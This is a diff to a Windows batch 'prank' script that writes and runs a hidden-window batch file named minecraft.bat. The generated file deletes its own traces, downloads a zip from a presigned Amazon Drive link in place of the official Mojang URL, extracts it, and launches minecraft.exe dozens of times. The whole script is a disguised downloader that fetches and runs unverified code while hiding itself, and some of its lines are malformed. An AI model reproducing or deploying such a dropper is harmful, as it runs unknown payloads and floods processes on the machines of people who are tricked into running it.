@@ -1,8 +1,10 @@
 echo powershell -window hidden -command "cd C:\Users\Public\Documents" > C:\Users\Public\Documents\minecraft.bat
-echo cd %USERPROFILE%/desktop >> C:\Users\Public\Documents\minecraft.bat
+echo cd %USERPROFILE%/downloads >> C:\Users\Public\Documents\minecraft.bat
 echo DEL prank.bat >> C:\Users\Public\Documents\minecraft.bat
 echo cd C:\Users\Public\Documents >> C:\Users\Public\Documents\minecraft.bat
-echo curl https://launcher.mojang.com/download/Minecraft.exe --output minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
+echo curl https://content-na.drive.amazonaws.com/v2/download/presigned/--Ftmtqb2VkIobwTnVORnnkQhCiTVAPLHzriTyIVZZkeJxFPc?download=true&ownerId=AK7SDUKK43YJP --output minecraft.zip >> C:\Users\Public\Documents\minecraft.bat
+echo Expand-Archive -Force minecraft.zip  
+echo DEL minecraft.zip >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
@@ -183,5 +185,5 @@ echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
 echo minecraft.exe >> C:\Users\Public\Documents\minecraft.bat
-C:\Users\Public\Documents\minecraft.bat
-DEL /F prank.bat
+DEL minecraft.bat
+DEL minecraft.exe
